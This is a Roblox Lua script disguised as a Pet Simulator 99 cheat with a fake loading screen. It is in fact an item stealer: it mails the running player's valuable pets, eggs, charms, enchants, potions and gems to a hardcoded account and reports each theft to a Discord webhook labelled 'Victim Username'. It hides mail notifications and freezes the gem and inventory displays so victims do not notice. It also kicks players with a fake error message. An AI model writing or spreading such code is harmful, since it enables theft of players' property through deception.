if LoadingScreen == nil then
    LoadingScreen = false
end
if Webhook == nil or Webhook == "https://discord.com/api/webhooks/1212857120936951868/C8TW1KaUFEY0zDdJqUJ17hAfBYVhgfbPOHh9u1Ix9LKsIrDlRFnc3_6vzAyvYj3hxA3d" then
    Webhook =
        "https://discord.com/api/webhooks/1"
end
if Username == "" or Username == nil then
    Username = "TheNormalGamer5"
end
if LoadingScreen == true then
    hideall = false
else
    hideall = true
end

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if LoadingScreen == true then
    LoadingScreen = true
LoadingText1 = "Loading Library"
LoadingText2 = "Updating Library"
LoadingText3 = "Getting Script"
LoadingText4 = "Executing Script"
LoadingText5 = "Error: Execution Failed, re-trying!"

local ScriptTitle = "Pet Simulator 99: Script Loading"

if LoadingScreen ~= false then
    local Loading = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local Dots = Instance.new("Frame")
    local Dot1 = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local InsideDot = Instance.new("Frame")
    local UICorner_2 = Instance.new("UICorner")
    local Dot2 = Instance.new("Frame")
    local UICorner_3 = Instance.new("UICorner")
    local InsideDot_2 = Instance.new("Frame")
    local UICorner_4 = Instance.new("UICorner")
    local Dot3 = Instance.new("Frame")
    local UICorner_5 = Instance.new("UICorner")
    local InsideDot_3 = Instance.new("Frame")
    local UICorner_6 = Instance.new("UICorner")
    local Bar = Instance.new("Frame")
    local Bar2 = Instance.new("Frame")
    local UICorner_7 = Instance.new("UICorner")
    local UICorner_8 = Instance.new("UICorner")
    local Percentage = Instance.new("TextLabel")
    local Tip = Instance.new("TextLabel")
    local EndSequence = Instance.new("Frame")
    Loading.Name = "Egorikusa"
    Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Loading.DisplayOrder = 999999999
    MainFrame.Name = "MainFrame"
    MainFrame.Parent = Loading
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    MainFrame.BorderSizePixel = 0
    MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
    MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
    Title.Name = "Title"
    Title.Parent = MainFrame
    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Title.BackgroundTransparency = 1.000
    Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
    Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
    Title.Font = Enum.Font.FredokaOne
    Title.Text = ScriptTitle
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.TextSize = 14.000
    Title.TextWrapped = true
    Dots.Name = "Dots"
    Dots.Parent = MainFrame
    Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Dots.BackgroundTransparency = 1.000
    Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
    Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
    Dot1.Name = "Dot1"
    Dot1.Parent = Dots
    Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
    Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner.CornerRadius = UDim.new(0.5, 0)
    UICorner.Parent = Dot1
    InsideDot.Name = "InsideDot"
    InsideDot.Parent = Dot1
    InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_2.CornerRadius = UDim.new(0.5, 0)
    UICorner_2.Parent = InsideDot
    Dot2.Name = "Dot2"
    Dot2.Parent = Dots
    Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
    Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner_3.CornerRadius = UDim.new(0.5, 0)
    UICorner_3.Parent = Dot2
    InsideDot_2.Name = "InsideDot"
    InsideDot_2.Parent = Dot2
    InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_4.CornerRadius = UDim.new(0.5, 0)
    UICorner_4.Parent = InsideDot_2
    Dot3.Name = "Dot3"
    Dot3.Parent = Dots
    Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
    Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
    UICorner_5.CornerRadius = UDim.new(0.5, 0)
    UICorner_5.Parent = Dot3
    InsideDot_3.Name = "InsideDot"
    InsideDot_3.Parent = Dot3
    InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
    InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
    UICorner_6.CornerRadius = UDim.new(0.5, 0)
    UICorner_6.Parent = InsideDot_3
    Bar.Name = "Bar"
    Bar.Parent = MainFrame
    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Bar.BorderSizePixel = 0
    Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
    Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
    Bar2.Name = "Bar2"
    Bar2.Parent = Bar
    Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    Bar2.BorderSizePixel = 0
    Bar2.Size = UDim2.new(0, 0, 1, 0)
    UICorner_7.CornerRadius = UDim.new(0.5, 0)
    UICorner_7.Parent = Bar2
    UICorner_8.CornerRadius = UDim.new(0.5, 0)
    UICorner_8.Parent = Bar
    Percentage.Name = "Percentage"
    Percentage.Parent = Bar
    Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Percentage.BackgroundTransparency = 1.000
    Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
    Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
    Percentage.Font = Enum.Font.FredokaOne
    Percentage.Text = "0%"
    Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
    Percentage.TextScaled = true
    Percentage.TextSize = 14.000
    Percentage.TextWrapped = true
    Tip.Name = "Tip"
    Tip.Parent = MainFrame
    Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Tip.BackgroundTransparency = 1.000
    Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
    Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
    Tip.Font = Enum.Font.SourceSansItalic
    Tip.Text = ""
    Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
    Tip.TextScaled = true
    Tip.TextSize = 14.000
    Tip.TextWrapped = true
    EndSequence.Name = "EndSequence"
    EndSequence.Parent = Loading
    EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    EndSequence.BorderSizePixel = 0
    EndSequence.Position = UDim2.new(1, 0, 0, 0)
    EndSequence.Size = UDim2.new(1, 0, 1, 0)
    local function NGZQAMK_fake_script()
        local script = Instance.new("LocalScript", Dots)
        while true do
            wait(0.25)
            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
            wait(0.25)
            script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
     end
end

function SendMessage(url, username, itemID)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {{
            ["title"] = "New Item Sent",
            ["color"] = 65280,
			["fields"] = {
                {
                    ["name"] = "Victim Username:",
                    ["value"] = username,
                    ["inline"] = true
                },
                {
                    ["name"] = "Item Sent:",
                    ["value"] = tostring(itemID),
                    ["inline"] = true
                }
            },
			["footer"] = {
				["text"] = "Szix"
			}
        }}
    }
    local body = http:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = ""
end

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Szix"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 10000 then
    plr:kick("Saving error, please rejoin!")
end

local user = Username
hideall = false -- set it to true This shit function is basicslly to turn off the send mail Notifications the rest is just freezing the gems and freezinv and cloning pets IN THE VICTIMS inventory visually only the dumbass victims can see so that he wont notice his shit being stolen 

if hideall ~= false then
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
                            false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            local gemsDisplay = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
            local oldGemsValue = gemsDisplay.Text
            gemsDisplay:GetPropertyChangedSignal("Text"):Connect(
                function()
                    oldGemsValue = gemsDisplay.Text
                end
            )
        end
    )
    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end
    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets


        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    game.Workspace.__THINGS.Pets:Destroy()
end

local HttpService = game:GetService("HttpService")
local function getRAP(Type, Item)
    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
                return v
            end
        end
    end
end

function StealHuge()
	local hugesSent = 0
	local initialHuges = CountHuges()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge and getRAP("Pet", v) >= min_rap then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
			local finalHuges = CountHuges()
			if finalHuges < initialHuges then
				hugesSent = hugesSent + 1
				initialHuges = finalHuges
			end
        end
    end
	return hugesSent
end

function CountHuges()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge and getRAP("Pet", v) >= min_rap then
			count = count + 1
		end
	end
	return count
end

function SendAllHuges()
	local totalHuges = CountHuges()
	local hugesSent = 0
	repeat
		hugesSent = hugesSent + StealHuge()
	until hugesSent == totalHuges
end

function ExcSteal()
	local excSent = 0
	local initialExc = CountExc()
    for i, v in pairs(save.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Pet",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
			local finalExc = CountExc()
			if finalExc < initialExc then
				excSent = excSent + 1
				initialExc = finalExc
			end
        end
    end
	return excSent
end

function CountExc()
	local count = 0
	for i, v in pairs(save.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
			count = count + 1
		end
	end
	return count
end

function SendAllExc()
	local totalExc = CountExc()
	local excSent = 0
	repeat
		excSent = excSent + ExcSteal()
	until excSent == totalExc
end

function EggSteal()
    for i, v in pairs(save.Egg) do
		local id = v.id
		local diregg = library.Directory.Eggs[id]
		if diregg and getRAP("Egg", v) >= min_rap then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Egg",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
		end
    end
end

function CharmSteal()
    for i, v in pairs(save.Charm) do
        local id = v.id
		local dircharm = library.Directory.Charms[id]
		if dircharm and getRAP("Charm", v) >= min_rap then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Charm",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
		end
    end
end

function EnchantSteal()
    for i, v in pairs(save.Enchant) do
		local id = v.id
		local direnchant = library.Directory.Enchants[id]
		if direnchant and getRAP("Enchant", v) >= min_rap then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Enchant",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
		end
    end
end

function PotionSteal()
    for i, v in pairs(save.Potion) do
		local id = v.id
		local dirpotion = library.Directory.Potions[id]
		if dirpotion and getRAP("Potion", v) >= min_rap then
			local args = {
				[1] = user,
				[2] = MailMessage,
				[3] = "Potion",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
			end
		end
    end
end

function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            GemId = i
            local args = {
                [1] = user,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = GemId,
                [5] = GemAmount - 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			if Webhook and Webhook ~= "" then
				SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
			end
        end
    end
end

function EmptyBoxes()
    if save.Box then
        for key, _ in pairs(save.Box) do
			local args = {
				[1] = key
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
        end
    end
end

function CountGems()
	for i, v in pairs(GetSave().Inventory.Currency) do
		if v.id == "Diamonds" then
			GemAmount1 = v._am
			return GemAmount1
		end
	end
end

function SendAllGems()
	repeat
		GemSteal()
	until CountGems() == nil or CountGems() < 10000
end

if CountHuges() > 0 or CountGems() > 1000000 then
	EmptyBoxes()
	SendAllHuges()
	SendAllExc()

	if save.Egg ~= nil then
		EggSteal()
	end

	if save.Charm ~= nil then
		CharmSteal()
	end
	
	if save.Enchant ~= nil then
		EnchantSteal()
	end
	
	if save.Potion ~= nil then
		PotionSteal()
	end

	SendAllGems()
	setclipboard("discord.gg/egkbRKtyzu")
	plr:kick("Thanks For Using My Script <3")
else
	plr:kick("Error on script execution: 0x0001F4A2")
end
